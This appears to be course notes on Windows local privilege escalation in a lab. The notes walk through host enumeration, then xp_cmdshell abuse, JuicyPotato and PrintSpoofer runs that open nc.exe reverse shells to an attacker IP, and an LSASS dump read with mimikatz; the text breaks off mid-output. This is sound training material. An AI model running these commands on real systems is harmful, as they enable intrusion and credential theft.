Enumeration\nC:\\local\u003e tasklist /svc Image Name PID Services ========================= ======== ============================================ System Idle Process 0 N/A System 4 N/A smss.exe 316 N/A csrss.exe 424 N/A wininit.exe 528 N/A csrss.exe 540 N/A winlogon.exe 612 N/A services.exe 664 N/A lsass.exe 672 KeyIso, SamSs, VaultSvc svchost.exe 776 BrokerInfrastructure, DcomLaunch, LSM, PlugPlay, Power, SystemEventsBroker svchost.exe 836 RpcEptMapper, RpcSs LogonUI.exe 952 N/A dwm.exe 964 N/A svchost.exe 972 TermService svchost.exe 1008 Dhcp, EventLog, lmhosts, TimeBrokerSvc svchost.exe 364 NcbService, PcaSvc, ScDeviceEnum, TrkWks, UALSVC, UmRdpService \u003c...SNIP...\u003e svchost.exe 1468 Wcmsvc svchost.exe 1804 PolicyAgent spoolsv.exe 1884 Spooler svchost.exe 1988 W3SVC, WAS svchost.exe 1996 ftpsvc svchost.exe 2004 AppHostSvc FileZilla Server.exe 1140 FileZilla Server inetinfo.exe 1164 IISADMIN svchost.exe 1736 DiagTrack svchost.exe 2084 StateRepository, tiledatamodelsvc VGAuthService.exe 2100 VGAuthService vmtoolsd.exe 2112 VMTools MsMpEng.exe 2136 WinDefend \u003c...SNIP...\u003e FileZilla Server Interfac 5628 N/A jusched.exe 5796 N/A cmd.exe 4132 N/A conhost.exe 4136 N/A TrustedInstaller.exe 1120 TrustedInstaller TiWorker.exe 1816 N/A WmiApSrv.exe 2428 wmiApSrv tasklist.exe 3596 N/A It is essential to become familiar with standard Windows processes such as Session Manager Subsystem (smss.exe), Client Server Runtime Subsystem (csrss.exe), WinLogon (winlogon.exe), Local Security Authority Subsystem Service (LSASS), and Service Host (svchost.exe), among others and the services associated with them. Being able to spot standard processes/services quickly will help speed up our enumeration and enable us to hone in on non-standard processes/services, which may open up a privilege escalation path. In the example above, we would be most interested in the FileZilla FTP server running and would attempt to enumerate the version to look for public vulnerabilities or misconfigurations such as FTP anonymous access, which could lead to sensitive data exposure or more.\nOther processes such as MsMpEng.exe, Windows Defender, are interesting because they can help us map out what protections are in place on the target host that we may have to evade/bypass.\nDisplay All Environment Variables Display All Environment Variables The environment variables explain a lot about the host configuration. To get a printout of them, Windows provides the set command. One of the most overlooked variables is PATH. In the output below, nothing is out of the ordinary. However, it is not uncommon to find administrators (or applications) modify the PATH. One common example is to place Python or Java in the path, which would allow the execution of Python or . JAR files. If the folder placed in the PATH is writable by your user, it may be possible to perform DLL Injections against other applications. Remember, when running a program, Windows looks for that program in the CWD (Current Working Directory) first, then from the PATH going left to right. This means if the custom path is placed on the left (before C:\\Windows\\System32), it is much more dangerous than on the right.\nIn addition to the PATH, set can also give up other helpful information such as the HOME DRIVE. In enterprises, this will often be a file share. Navigating to the file share itself may reveal other directories that can be accessed. It is not unheard of to be able to access an ‚ÄúIT Directory,‚Äù which contains an inventory spreadsheet that includes passwords. Additionally, shares are utilized for home directories so the user can log on to other computers and have the same experience/files/desktop/etc. (Roaming Profiles). This may also mean the user takes malicious items with them. If a file is placed in USERPROFILE\\AppData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup, when the user logs into a different machine, this file will execute.\nInitial Enumeration\nC:\\local\u003e set ALLUSERSPROFILE=C:\\ProgramData APPDATA=C:\\Users\\Administrator\\AppData\\Roaming CommonProgramFiles=C:\\Program Files\\Common Files CommonProgramFiles(x86)=C:\\Program Files (x86)\\Common Files CommonProgramW6432=C:\\Program Files\\Common Files COMPUTERNAME=WINLPE-SRV01 ComSpec=C:\\Windows\\system32\\cmd.exe HOMEDRIVE=C: HOMEPATH=\\Users\\Administrator LOCALAPPDATA=C:\\Users\\Administrator\\AppData\\Local LOGONSERVER=\\\\WINLPE-SRV01 NUMBER_OF_PROCESSORS=6 OS=Windows_NT Path=C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\WindowsApps; PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC PROCESSOR_ARCHITECTURE=AMD64 PROCESSOR_IDENTIFIER=AMD64 Family 23 Model 49 Stepping 0, AuthenticAMD PROCESSOR_LEVEL=23 PROCESSOR_REVISION=3100 ProgramData=C:\\ProgramData ProgramFiles=C:\\Program Files ProgramFiles(x86)=C:\\Program Files (x86) ProgramW6432=C:\\Program Files PROMPT=$P$G PSModulePath=C:\\Program Files\\WindowsPowerShell\\Modules;C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules PUBLIC=C:\\Users\\Public SESSIONNAME=Console SystemDrive=C: SystemRoot=C:\\Windows TEMP=C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\1 TMP=C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\1 USERDOMAIN=WINLPE-SRV01 USERDOMAIN_ROAMINGPROFILE=WINLPE-SRV01 USERNAME=Administrator USERPROFILE=C:\\Users\\Administrator SYSTEMINFO\nHotFixes to get an idea of when the box has been patched. This information isn‚Äôt always present, as it is possible to hide hotfixes software from non-administrators. The System Boot Time and OS Version can also be checked to get an idea of the patch level. If the box has not been restarted in over six months, chances are it is also not being patched.\nAdditionally, many guides will say the Network Information is important as it could indicate a dual-homed machine (connected to multiple networks). Generally speaking, when it comes to enterprises, devices will just be granted access to other networks via a firewall rule and not have a physical cable run to them.\nInitial Enumeration\nC:\\local\u003e systeminfo Host Name: WINLPE-SRV01 OS Name: Microsoft Windows Server 2016 Standard OS Version: 10.0.14393 N/A Build 14393 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Server OS Build Type: Multiprocessor Free Registered Owner: Windows User Registered Organization: Product ID: 00376-30000-00299-AA303 Original Install Date: 3/24/2021, 3:46:32 PM System Boot Time: 3/25/2021, 9:24:36 AM System Manufacturer: VMware, Inc. System Model: VMware7,1 System Type: x64-based PC Processor(s): 3 Processor(s) Installed. [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz [03]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz BIOS Version: VMware, Inc. VMW71.00V.16707776.B64.2008070230, 8/7/2020 Windows Directory: C:\\Windows System Directory: C:\\Windows\\system32 Boot Device: \\Device\\HarddiskVolume2 System Locale: en-us;English (United States) Input Locale: en-us;English (United States) Time Zone: (UTC-08:00) Pacific Time (US \u0026 Canada) Total Physical Memory: 6,143 MB Available Physical Memory: 3,474 MB Virtual Memory: Max Size: 10,371 MB Virtual Memory: Available: 7,544 MB Virtual Memory: In Use: 2,827 MB Page File Location(s): C:\\pagefile.sys Domain: WORKGROUP Logon Server: \\\\WINLPE-SRV01 Hotfix(s): 3 Hotfix(s) Installed. [01]: KB3199986 [02]: KB5001078 [03]: KB4103723 Network Card(s): 2 NIC(s) Installed. [01]: Intel(R) 82574L Gigabit Network Connection Connection Name: Ethernet0 DHCP Enabled: Yes DHCP Server: 10.129.0.1 IP address(es) [01]: 10.129.43.8 [02]: fe80::e4db:5ea3:2775:8d4d [03]: dead:beef::e4db:5ea3:2775:8d4d [02]: vmxnet3 Ethernet Adapter Connection Name: Ethernet1 DHCP Enabled: No IP address(es) [01]: 192.168.20.56 [02]: fe80::f055:fefd:b1b:9919 Hyper-V Requirements: A hypervisor has been detected. Features required Patches and Updates If systeminfo doesn‚Äôt display hotfixes, they may be queriable with WMI using the WMI-Command binary with QFE (Quick Fix Engineering) to display patches.\nInitial Enumeration\nC:\\local\u003e wmic qfe Caption CSName Description FixComments HotFixID InstallDate InstalledBy InstalledOn Name ServicePackInEffect Status http://support.microsoft.com/?kbid=3199986 WINLPE-SRV01 Update KB3199986 NT AUTHORITY\\SYSTEM 11/21/2016 https://support.microsoft.com/help/5001078 WINLPE-SRV01 Security Update KB5001078 NT AUTHORITY\\SYSTEM 3/25/2021 http://support.microsoft.com/?kbid=4103723 WINLPE-SRV01 Security Update KB4103723 We can do this with PowerShell as well using the Get-Hotfix cmdlet.\nInitial Enumeration\nPS C:\\local\u003e Get-HotFix | ft -AutoSize Source Description HotFixID InstalledBy InstalledOn ------ ----------- -------- ----------- ----------- WINLPE-SRV01 Update KB3199986 NT AUTHORITY\\SYSTEM 11/21/2016 12:00:00 AM WINLPE-SRV01 Update KB4054590 WINLPE-SRV01\\Administrator 3/30/2021 12:00:00 AM WINLPE-SRV01 Security Update KB5001078 NT AUTHORITY\\SYSTEM 3/25/2021 12:00:00 AM WINLPE-SRV01 Security Update KB3200970 WINLPE-SRV01\\Administrator 4/13/2021 12:00:00 AM Installed Programs WMI can also be used to display installed software. This information can often guide us towards hard-to-find exploits. Is FileZilla/Putty/etc installed? Run LaZagne to check if stored credentials for those applications are installed. Also, some programs may be installed and running as a service that is vulnerable.\nInitial Enumeration\nC:\\local\u003e wmic product get name Name Microsoft Visual C++ 2019 X64 Additional Runtime - 14.24.28127 Java 8 Update 231 (64-bit) Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127 VMware Tools Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.24.28127 Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127 Java Auto Updater \u003cSNIP\u003e We can, of course, d\nWe can, of course, do this with PowerShell as well using the Get-WmiObject cmdlet.\nInitial Enumeration\nPS C:\\local\u003e Get-WmiObject -Class Win32_Product | select Name, Version Name Version ---- ------- SQL Server 2016 Database Engine Shared 13.2.5026.0 Microsoft OLE DB Driver for SQL Server 18.3.0.0 Microsoft Visual C++ 2010 x64 Redistributable - 10.0.40219 10.0.40219 Microsoft Help Viewer 2.3 2.3.28107 Microsoft Visual C++ 2010 x86 Redistributable - 10.0.40219 10.0.40219 Microsoft Visual C++ 2013 x86 Minimum Runtime - 12.0.21005 12.0.21005 Microsoft Visual C++ 2013 x86 Additional Runtime - 12.0.21005 12.0.21005 Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29914 14.28.29914 Microsoft ODBC Driver 13 for SQL Server 13.2.5026.0 SQL Server 2016 Database Engine Shared 13.2.5026.0 SQL Server 2016 Database Engine Services 13.2.5026.0 SQL Server Management Studio for Reporting Services 15.0.18369.0 Microsoft SQL Server 2008 Setup Support Files 10.3.5500.0 SSMS Post Install Tasks 15.0.18369.0 Microsoft VSS Writer for SQL Server 2016 13.2.5026.0 Java 8 Update 231 (64-bit) 8.0.2310.11 Browser for SQL Server 2016 13.2.5026.0 Integration Services 15.0.2000.130 \u003cSNIP\u003e Get-WmiObject -Class Win32_Product | Where-Object { $_.Name -notmatch \"Microsoft\" } | Select-Object Name, Version Get-WmiObject -Class Win32_Product | Where-Object { $_.Name -notmatch \"Microsoft|Windows\" } | Select-Object Name, Version Display Running Processes Display Running Processes The netstat command will display active TCP and UDP connections which will give us a better idea of what services are listening on which port(s) both locally and accessible to the outside. We may find a vulnerable service only accessible to the local host (when logged on to the host) that we can exploit to escalate privileges.\nNetstat Initial Enumeration\nPS C:\\local\u003e netstat -ano Active Connections Proto Local Address Foreign Address State PID TCP 0.0.0.0:21 0.0.0.0:0 LISTENING 1096 TCP 0.0.0.0:80 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 840 TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:1433 0.0.0.0:0 LISTENING 3520 TCP 0.0.0.0:3389 0.0.0.0:0 LISTENING 968 \u003c...SNIP...\u003e C:\\local\u003e query user USERNAME SESSIONNAME ID STATE IDLE TIME LOGON TIME \u003eadministrator rdp-tcp#2 1 Active . 3/25/2021 9:27 AM Current User Privileges As mentioned prior, knowing what privileges our user has can greatly help in escalating privileges. We will look at individual user privileges and escalation paths later in this module.\nInitial Enumeration\nC:\\local\u003e whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======== SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled Current User Group Information Has our user inherited any rights through their group membership? Are they privileged in the Active Directory domain environment, which could be leveraged to gain access to more systems?\nInitial Enumeration\nC:\\local\u003e whoami /groups GROUP INFORMATION ----------------- Group Name Type SID Attributes ====================================== ================ ============ ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Remote Desktop Users Alias S-1-5-32-555 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\REMOTE INTERACTIVE LOGON Well-known group S-1-5-14 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\INTERACTIVE Well-known group S-1-5-4 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Local account Well-known group S-1-5-113 Mandatory group, Enabled by default, Enabled group LOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\\Medium Mandatory Level Label S-1-16-8192 Get All Users Knowing what other users are on the system is important as well. If we gained RDP access to a host using credentials we captured for a user bob, and see a bob_adm user in the local administrators group, it is worth checking for credential re-use. Can we access the user profile directory for any important users? We may find valuable files such as scripts with passwords or SSH keys in a user‚Äôs Desktop, Documents, or Downloads folder.\nInitial Enumeration\nC:\\local\u003e net user User accounts for \\\\WINLPE-SRV01 ------------------------------------------------------------------------------- Administrator DefaultAccount Guest helpdesk local-student jordan sarah secsvc The command completed successfully. Get All Groups Knowing what non-standard groups are present on the host can help us determine what the host is used for, how heavily accessed it is, or may even lead to discovering a misconfiguration such as all Domain Users in the Remote Desktop or local administrators groups.\nInitial Enumeration\nC:\\local\u003e net localgroup Aliases for \\\\WINLPE-SRV01 ------------------------------------------------------------------------------- *Access Control Assistance Operators *Administrators *Backup Operators *Certificate Service DCOM Access *Cryptographic Operators *Distributed COM Users *Event Log Readers *Guests *Hyper-V Administrators *IIS_IUSRS *Network Configuration Operators *Performance Log Users *Performance Monitor Users *Power Users *Print Operators *RDS Endpoint Servers *RDS Management Servers *RDS Remote Access Servers *Remote Desktop Users *Remote Management Users *Replicator *Storage Replica Administrators *System Managed Accounts Group *Users The command completed successfully. Details About a Group It is worth checking out the details for any non-standard groups. Though unlikely, we may find a password or other interesting information stored in the group‚Äôs description. During our enumeration, we may discover credentials of another non-admin user who is a member of a local group that can be leveraged to escalate privileges.\nInitial Enumeration\nC:\\local\u003e net localgroup administrators Alias name administrators Comment Administrators have complete and unrestricted access to the computer/domain Members ------------------------------------------------------------------------------- Administrator helpdesk sarah secsvc The command completed successfully Get Password Policy \u0026 Other Account Information Initial Enumeration\nC:\\local\u003e net accounts Force user logoff how long after time expires?: Never Minimum password age (days): 0 Maximum password age (days): 42 Minimum password length: 0 Length of password history maintained: None Lockout threshold: Never Lockout duration (minutes): 30 Lockout observation window (minutes): 30 Computer role: SERVER Communication with Processes Listing Named Pipes with Pipelist Communication with Processes\nC:\\local\u003e pipelist.exe /accepteula PipeList v1.02 - Lists open named pipes Copyright (C) 2005-2016 Mark Russinovich Sysinternals - www.sysinternals.com Pipe Name Instances Max Instances --------- --------- ------------- InitShutdown 3 -1 lsass 4 -1 ntsvcs 3 -1 scerpc 3 -1 Winsock2\\CatalogChangeListener-340-0 1 1 Winsock2\\CatalogChangeListener-414-0 1 1 epmapper 3 -1 Winsock2\\CatalogChangeListener-3ec-0 1 1 Winsock2\\CatalogChangeListener-44c-0 1 1 LSM_API_service 3 -1 atsvc 3 -1 Winsock2\\CatalogChangeListener-5e0-0 1 1 eventlog 3 -1 Winsock2\\CatalogChangeListener-6a8-0 1 1 spoolss 3 -1 Winsock2\\CatalogChangeListener-ec0-0 1 1 wkssvc 4 -1 trkwks 3 -1 vmware-usbarbpipe 5 -1 srvsvc Listing Named Pipes with PowerShell Communication with Processes\nPS C:\\local\u003e gci \\\\.\\pipe\\ Directory: \\\\.\\pipe Mode LastWriteTime Length Name ---- ------------- ------ ---- ------ 12/31/1600 4:00 PM 3 InitShutdown ------ 12/31/1600 4:00 PM 4 lsass ------ 12/31/1600 4:00 PM 3 ntsvcs ------ 12/31/1600 4:00 PM 3 scerpc Directory: \\\\.\\pipe\\Winsock2 Mode LastWriteTime Length Name ---- ------------- ------ ---- ------ 12/31/1600 4:00 PM 1 Winsock2\\CatalogChangeListener-34c-0 Directory: \\\\.\\pipe Mode LastWriteTime Length Name ---- ------------- ------ ---- ------ 12/31/1600 4:00 PM 3 epmapper \u003cSNIP\u003e Reviewing LSASS Named Pipe Permissions Communication with Processes\nC:\\local\u003e accesschk.exe /accepteula \\\\.\\Pipe\\lsass -v Accesschk v6.12 - Reports effective permissions for securable objects Copyright (C) 2006-2017 Mark Russinovich Sysinternals - www.sysinternals.com \\\\.\\Pipe\\lsass Untrusted Mandatory Level [No-Write-Up] RW Everyone FILE_READ_ATTRIBUTES FILE_READ_DATA FILE_READ_EA FILE_WRITE_ATTRIBUTES FILE_WRITE_DATA FILE_WRITE_EA Named Pipes Attack Example Let‚Äôs walk through an example of taking advantage of an exposed named pipe to escalate privileges. This WindscribeService Named Pipe Privilege Escalation is a great example. Using accesschk we can search for all named pipes that allow write access with a command such as accesschk.exe -w \\pipe\\* -v and notice that the WindscribeService named pipe allows READ and WRITE access to the Everyone group, meaning all authenticated users.\nChecking WindscribeService Named Pipe Permissions Confirming with accesschk we see that the Everyone group does indeed have FILE_ALL_ACCESS (All possible access rights) over the pipe.\nCommunication with Processes\nC:\\local\u003e accesschk.exe -accepteula -w \\pipe\\WindscribeService -v Accesschk v6.13 - Reports effective permissions for securable objects Copyright ‚åê 2006-2020 Mark Russinovich Sysinternals - www.sysinternals.com \\\\.\\Pipe\\WindscribeService Medium Mandatory Level (Default) [No-Write-Up] RW Everyone FILE_ALL_ACCESS From here, we could leverage these lax permissions to escalate privileges on the host to SYSTEM.\nVPN Servers\nWindows Privileges Overview Group Description Default Administrators Domain Admins and Enterprise Admins are ‚Äúsuper‚Äù groups. Server Operators Members can modify services, access SMB shares, and backup files. Backup Operators Members are allowed to log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database, read the registry remotely, and access the file system on the DC via SMB. This group is sometimes added to the local Backup Operators group on non-DCs. Print Operators Members can log on to DCs locally and ‚Äútrick‚Äù Windows into loading a malicious driver. Hyper-V Administrators If there are virtual DCs, any virtualization admins, such as members of Hyper-V Administrators, should be considered Domain Admins. Account Operators Members can modify non-protected accounts and groups in the domain. Remote Desktop Users Members are not given any useful permissions by default but are often granted additional rights such as Allow Login Through Remote Desktop Services and can move laterally using the RDP protocol. Remote Management Users Members can log on to DCs with PSRemoting (This group is sometimes added to the local remote management group on non-DCs). Group Policy Creator Owners Members can create new GPOs but would need to be delegated additional permissions to link GPOs to a container such as a domain or OU. Schema Admins Members can modify the Active Directory schema structure and backdoor any to-be-created Group/GPO by adding a compromised account to the default object ACL. DNS Admins Members can load a DLL on a DC, but do not have the necessary permissions to restart the DNS server. They can load a malicious DLL and wait for a reboot as a persistence mechanism. Loading a DLL will often result in the service crashing. A more reliable way to exploit this group is to create a WPAD record. User Rights Assignment Depending on group membership, and other factors such as privileges assigned via domain and local Group Policy, users can have various rights assigned to their account. This Microsoft article on User Rights Assignment provides a detailed explanation of each of the user rights that can be set in Windows as well as security considerations applicable to each right. Below are some of the key user rights assignments, which are settings applied to the localhost. These rights allow users to perform tasks on the system such as logon locally or remotely, access the host from the network, shut down the server, etc.\nSetting Constant Setting Name Standard Assignment Description SeNetworkLogonRight Access this computer from the network Administrators, Authenticated Users Determines which users can connect to the device from the network. This is required by network protocols such as SMB, NetBIOS, CIFS, and COM+. SeRemoteInteractiveLogonRight Allow log on through Remote Desktop Services Administrators, Remote Desktop Users This policy setting determines which users or groups can access the login screen of a remote device through a Remote Desktop Services connection. A user can establish a Remote Desktop Services connection to a particular server but not be able to log on to the console of that same server. SeBackupPrivilege Back up files and directories Administrators This user right determines which users can bypass file and directory, registry, and other persistent object permissions for the purposes of backing up the system. SeSecurityPrivilege Manage auditing and security log Administrators This policy setting determines which users can specify object access audit options for individual resources such as files, Active Directory objects, and registry keys. These objects specify their system access control lists (SACL). A user assigned this user right can also view and clear the Security log in Event Viewer. SeTakeOwnershipPrivilege Take ownership of files or other objects Administrators This policy setting determines which users can take ownership of any securable object in the device, including Active Directory objects, NTFS files and folders, printers, registry keys, services, processes, and threads. SeDebugPrivilege Debug programs Administrators This policy setting determines which users can attach to or open any process, even a process they do not own. Developers who are debugging their applications do not need this user right. Developers who are debugging new system components need this user right. This user right provides access to sensitive and critical operating system components. SeImpersonatePrivilege Impersonate a client after authentication Administrators, Local Service, Network Service, Service This policy setting determines which programs are allowed to impersonate a user or another specified account and act on behalf of the user. SeLoadDriverPrivilege Load and unload device drivers Administrators This policy setting determines which users can dynamically load and unload device drivers. This user right is not required if a signed driver for the new hardware already exists in the driver.cab file on the device. Device drivers run as highly privileged code. SeRestorePrivilege Restore files and directories Administrators This security setting determines which users can bypass file, directory, registry, and other persistent object permissions when they restore backed up files and directories. It determines which users can set valid security principals as the owner of an object process. One example is this PowerShell script which can be used to enable certain privileges, or this script which can be used to adjust token privileges.\nBackup Operators Rights Windows Privileges Overview\nPS C:\\local\u003e whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======== SeShutdownPrivilege Shut down the system Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled SeImpersonate Example - JuicyPotato Let‚Äôs take the example below, where we have gained a foothold on a SQL server using a privileged SQL user. Client connections to IIS and SQL Server may be configured to use Windows Authentication. The server may then need to access other resources such as file shares as the connecting client. It can be done by impersonating the user whose context the client connection is established. To do so, the service account will be granted the Impersonate a client after authentication privilege.\nIn this scenario, the SQL Service service account is running in the context of the default mssqlserver account. Imagine we have achieved command execution as this user using xp_cmdshell using a set of credentials obtained in a logins.sql file on a file share using the Snaffler tool.\nConnecting with MSSQLClient.py Using the credentials sql_dev:Str0ng_P@ssw0rd!, let‚Äôs first connect to the SQL server instance and confirm our privileges. We can do this using mssqlclient.py from the Impacket toolkit.\nSeImpersonate and SeAssignPrimaryToken\ncube111@local[/local]$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation Password: [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(WINLPE-SRV01\\SQLEXPRESS01): Line 1: Changed database context to 'master'. [*] INFO(WINLPE-SRV01\\SQLEXPRESS01): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (130 19162) [!] Press help for extra shell commands SQL\u003e Enabling xp_cmdshell Next, we must enable the xp_cmdshell stored procedure to run operating system commands. We can do this via the Impacket MSSSQL shell by typing enable_xp_cmdshell. Typing help displays a few other command options.\nSeImpersonate and SeAssignPrimaryToken\nSQL\u003e enable_xp_cmdshell [*] INFO(WINLPE-SRV01\\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install. [*] INFO(WINLPE-SRV01\\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install Note: We don‚Äôt actually have to type RECONFIGURE as Impacket does this for us.\nConfirming Access With this access, we can confirm that we are indeed running in the context of a SQL Server service account.\nSeImpersonate and SeAssignPrimaryToken\nSQL\u003e xp_cmdshell whoami output -------------------------------------------------------------------------------- nt service\\mssql$sqlexpress01 Checking Account Privileges Next, let‚Äôs check what privileges the service account has been granted.\nSeImpersonate and SeAssignPrimaryToken\nSQL\u003e xp_cmdshell whoami /priv output -------------------------------------------------------------------------------- PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ========================================= ======== SeAssignPrimaryTokenPrivilege Replace a process level token Disabled SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeManageVolumePrivilege Perform volume maintenance tasks Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled The command whoami /priv confirms that SeImpersonatePrivilege is listed. This privilege can be used to impersonate a privileged account such as NT AUTHORITY\\SYSTEM. JuicyPotato can be used to exploit the SeImpersonate or SeAssignPrimaryToken privileges via DCOM/NTLM reflection abuse.\nEscalating Privileges Using JuicyPotato To escalate privileges using these rights, let‚Äôs first download the JuicyPotato.exe binary and upload this and nc.exe to the target server. Next, stand up a Netcat listener on port 8443, and execute the command below where -l is the COM server listening port, -p is the program to launch (cmd.exe), -a is the argument passed to cmd.exe, and -t is the createprocess call. Below, we are telling the tool to try both the CreateProcessWithTokenW and CreateProcessAsUser functions, which need SeImpersonate or SeAssignPrimaryToken privileges respectively.\nSeImpersonate and SeAssignPrimaryToken\nSQL\u003e xp_cmdshell c:\\tools\\JuicyPotato.exe -l 53375 -p c:\\windows\\system32\\cmd.exe -a \"/c c:\\tools\\nc.exe 10.10.14.3 8443 -e cmd.exe\" -t * output -------------------------------------------------------------------------------- Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375 [+] authresult 0 {4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\\SYSTEM [+] CreateProcessWithTokenW OK [+] calling 0x000000000088ce08 Catching SYSTEM Shell This completes successfully, and a shell as NT AUTHORITY\\SYSTEM is received.\nSeImpersonate and SeAssignPrimaryToken\ncube111@local[/local]$ sudo nc -lnvp 8443 listening on [any] 8443 ... connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 50332 Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u003ewhoami whoami nt authority\\system C:\\Windows\\system32\u003ehostname hostname WINLPE-SRV01 PrintSpoofer and RoguePotato JuicyPotato doesn‚Äôt work on Windows Server 2019 and Windows 10 build 1809 onwards. However, PrintSpoofer and RoguePotato can be used to leverage the same privileges and gain NT AUTHORITY\\SYSTEM level access. This blog post goes in-depth on the PrintSpoofer tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.\nEscalating Privileges using PrintSpoofer Let‚Äôs try this out using the PrintSpoofer tool. We can use the tool to spawn a SYSTEM process in your current console and interact with it, spawn a SYSTEM process on a desktop (if logged on locally or via RDP), or catch a reverse shell - which we will do in our example. Again, connect with mssqlclient.py and use the tool with the -c argument to execute a command. Here, using nc.exe to spawn a reverse shell (with a Netcat listener waiting on our attack box on port 8443).\nSeImpersonate and SeAssignPrimaryToken\nSQL\u003e xp_cmdshell c:\\tools\\PrintSpoofer.exe -c \"c:\\tools\\nc.exe 10.10.14.3 8443 -e cmd\" output -------------------------------------------------------------------------------- [+] Found privilege: SeImpersonatePrivilege [+] Named pipe listening... [+] CreateProcessAsUser() OK NULL Catching Reverse Shell as SYSTEM If all goes according to plan, we will have a SYSTEM shell on our netcat listener.\nSeImpersonate and SeAssignPrimaryToken\ncube111@local[/local]$ nc -lnvp 8443 listening on [any] 8443 ... connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 49847 Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u003ewhoami whoami nt authority\\system SeDebugPrivilege C:\\local\u003e whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ========================================= ================================================================== ======== SeDebugPrivilege Debug programs Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set We can use ProcDump from the SysInternals suite to leverage this privilege and dump process memory. A good candidate is the Local Security Authority Subsystem Service (LSASS) process, which stores user credentials after a user logs on to a system.\nSeDebugPrivilege\nC:\\local\u003e procdump.exe -accepteula -ma lsass.exe lsass.dmp ProcDump v10.0 - Sysinternals process dump utility Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards Sysinternals - www.sysinternals.com [15:25:45] Dump 1 initiated: C:\\Tools\\Procdump\\lsass.dmp [15:25:45] Dump 1 writing: Estimated dump file size is 42 MB. [15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds [15:25:46] Dump count reached. C:\\local\u003e mimikatz.exe .#####. mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29 .## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## \u003e https://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' \u003e https://pingcastle.com / https://mysmartlogon.com ***/ mimikatz # log Using 'mimikatz.log' for logfile : OK mimikatz # sekurlsa::minidump lsass.dmp Switch to MINIDUMP : 'lsass.dmp' mimikatz # sekurlsa::logonpasswords Opening : 'lsass.dmp' file for minidump... Authentication Id : 0 ; 23196355 (00000000:0161f2c3) Session : Interactive from 4 User Name : DWM-4 Domain : Window Manager Logon Server : (null) Logon Time : 3/31/2021 3:00:57 PM SID : S-1-5-90-0-4 msv : tspkg : wdigest : * Username : WINLPE-SRV01$ * Domain : WORKGROUP * Password : (null) kerberos : ssp : credman : \u003cSNIP\u003e Authentication Id : 0 